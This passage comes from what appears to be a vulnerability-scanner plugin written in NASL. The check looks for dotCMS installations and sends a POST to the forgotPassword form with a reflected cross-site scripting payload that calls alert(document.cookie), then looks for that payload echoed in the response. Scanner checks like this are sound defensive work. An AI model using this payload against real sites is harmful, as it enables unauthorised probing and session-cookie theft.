...
for dir in nasl_make_list_unique( "/", "/dotcms", "/cms", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	sndReq = http_get( item: NASLString( dir, "/application/login/login.html" ), port: http_port );
	rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
	if(rcvRes && ContainsString( rcvRes, "href=\"/dotCMS" )){
		postdata = "dispatch=forgotPassword&reset_password=true&email=\"><script>ale" + "rt(document.cookie);</script>";
		sndReq = NASLString( "POST ", dir, "/forgotPassword HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n\\r\\n", postdata );
		rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq );
		if(IsMatchRegexp( rcvRes, "^HTTP/1\\.[01] 200" ) && ContainsString( rcvRes, "<script>alert(document.cookie);</script>" ) && ContainsString( rcvRes, "dotCMS" )){
